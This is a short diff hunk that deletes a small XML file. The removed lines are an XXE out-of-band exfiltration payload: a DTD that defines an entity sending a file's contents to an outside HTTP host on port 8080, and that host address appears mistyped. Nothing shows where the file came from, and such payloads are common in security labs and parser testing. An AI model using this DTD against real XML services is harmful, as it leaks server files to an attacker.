@@ -1,4 +1,0 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://i10.10.13.223:8080?%file;'>">
-%all;
-
